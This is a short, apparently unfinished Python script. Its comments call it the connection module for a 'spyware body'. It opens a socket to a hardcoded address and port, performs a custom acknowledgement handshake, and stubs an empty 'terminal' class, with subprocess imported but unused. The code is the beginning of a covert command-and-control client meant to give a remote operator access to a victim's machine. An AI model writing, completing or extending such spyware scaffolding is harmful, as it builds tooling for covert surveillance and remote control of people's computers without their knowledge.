import socket
import time
import os
import subprocess
#establishing standards:
#b'_' acknowledgement
#b'&end' signifys finnishing a transmition
class remote_connection: #hopefully this class should provide neatly packaged functions to be shipped to the actual main spyware body
    def __init__(self) -> None:
        self.server = socket.socket()
        self.connect()
    def connect(self):
        self.server.connect(("192.168.1.141",8017))
        self.handshake(["connected"])
    def handshake(self,buffer):
        receive_buffer = []
        self.server.recv(1024)
        self.server.sendall(b"_")
        while True:
            recv = self.server.recv(1024)
            if recv == b"&end":
                break
            self.server.sendall(b"_")
            receive_buffer.append(recv.decode())
        print("half handshake completed, new buffer of",receive_buffer)
        self.server.sendall(b"_")
        self.server.recv(1024)
        send_buffer = buffer
        for i in send_buffer:
            self.server.sendall(i.encode())
            self.server.recv(1024)
        self.server.sendall(b"&end")
class terminal:
    def __init__(self) -> None:
        pass
socket_handler = remote_connection()